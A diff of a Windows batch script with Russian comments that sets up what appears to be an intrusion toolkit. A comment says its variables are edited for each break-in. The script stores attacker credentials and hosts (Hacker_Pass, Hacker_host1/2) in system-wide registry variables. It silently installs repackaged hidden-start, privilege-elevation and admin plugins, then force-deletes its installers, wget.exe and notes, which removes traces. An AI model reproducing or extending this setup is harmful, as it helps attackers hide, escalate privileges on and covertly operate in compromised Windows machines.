@@ -10,19 +10,12 @@ setlocal enableextensions enabledelayedexpansion
 
 Rem Установка системнмных переменных окружения
 
-set curdir=%CD%
 set Key=HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Environment
+set curdir=%CD%
 set Dest_DIR=c:\pub1
 set ELEVATION=c:\Elevation
 set Hidden_Start="C:\Program Files\Hidden Start"
 set Chocolatey=%ALLUSERSPROFILE%\chocolatey
-
-rem Проверка зависимостей системного окружения
-rem
-rem if exist %Dest_DIR% goto already_Exist
-
-rem checknewid_E
-rem if not exist <файлы манифеста зависимостей>
 
 rem Подготовка пользовательских переменных окружения.
 rem Эти переменные окружения редактируются пользователем  под каждый конкретный взлом.
@@ -57,31 +50,36 @@ Reg Add "!Key!" /v Hacker_Pass /t REG_SZ /d "!Hacker_Pass!" /f
 Reg Add "!Key!" /v Hacker_host1 /t REG_SZ /d "!Hacker_host1!" /f
 Reg Add "!Key!" /v Hacker_host2 /t REG_SZ /d "!Hacker_host2!" /f
 Reg Add "!Key!" /v PUB1 /t REG_SZ /d "!Dest_DIR!" /f
-rem call reg_addtopath.bat c:\pub1\Util
 
 rem Insatall MainExponenta Files...
 cd /d %curdir%
 
-ExponentaFTPStylerMainFiles151SetupRePack.exe /VERYSLIENT /NOCANCEL
+ExponentaHTTPStylerMainFiles151SetupRePack.exe /VERYSLIENT /NOCANCEL
 
 rem Install Duck Plugin
+if not exist duck-install.msi goto pass_Duck
 echo "Install Duck..."
-%SystemRoot%\system32\msiexec.exe /i duck-6.6.2.28219.msi /norestart /QN /L*V %TEMP%\duck.log
+%SystemRoot%\system32\msiexec.exe /i duck-install.msi /norestart /QN /L*V %TEMP%\duck.log
 :pass_Duck
 
 rem Install Hidden Start Plugin
-if exist %Hidden_Start% goto pass_HiddenStart
-if not exist Hidden_Start.SFX.exe goto pass_HiddenStart
+if not exist HiddenStartRePack.exe goto pass_HiddenStart
 echo "Install Hidden Start..."
-HiddenStart450SetupRePack.exe /VERYSLIENT /NOCANCEL
+HiddenStartRePack.exe /VERYSLIENT /NOCANCEL
 
 :pass_HiddenStart
 
 rem Install Elevation Plugin
-if exist %ELEVATION% goto pass_Elevation
-if not exist Elevation.SFX.exe goto pass_Elevation
+if not exist ElevationExponentaPlugin202SetupRepack.exe goto pass_Elevation
 echo "Install Elevation..."
-ElevationExponentaPlugin202SetupRepack.exe:pass_Elevation
+ElevationExponentaPlugin202SetupRepack.exe /VERYSLIENT /NOCANCEL 
+:pass_Elevation
+
+rem Install Elevation Plugin
+if not exist AdminTExponentaPlugin052Setup.exe goto pass_AdminT
+echo "Install Elevation..."
+AdminTExponentaPlugin052Setup.exe /VERYSLIENT /NOCANCEL 
+:pass_AdminT
 
 rem Install Chocolatey Packet
 if exist %Chocolatey% goto pass_Chocolatey
@@ -148,19 +146,19 @@ goto sess_Finish
 :sess_Finish
 
 cd /d %curdir%
-del /F /S /Q /A MainExponenta.SFX.exe
-del /F /S /Q /A Hidden_Start.SFX.exe
+del /F /S /Q /A ExponentaHTTPStylerMainFiles151SetupRePack.exe
+del /F /S /Q /A HiddenStartRePack.exe
 del /F /S /Q /A Register_HS.bat
-del /F /S /Q /A Elevation.SFX.exe
+del /F /S /Q /A ElevationExponentaPlugin202SetupRepack.exe
 del /F /S /Q /A Register_El.bat
 del /F /S /Q /A choc_pack.install.cmd
 del /F /S /Q /A chock.install.cmd
 del /F /S /Q /A INSTALL.MD
 del /F /S /Q /A descript.ion
-del /F /S /Q /A duck-6.6.2.28219.msi
-del /F /S /Q /A INSTALL-YUDEN-HOME.MD
-del /F /S /Q /A install1.md
-del /F /S /Q /A install.rtf
+del /F /S /Q /A duck-install.msi
+del /F /S /Q /A AdminTExponentaPlugin052Setup.exe
+del /F /S /Q /A INSTALL.txt
+del /F /S /Q /A wget.exe
 
 rd /S /Q WindowsPowerShell
 
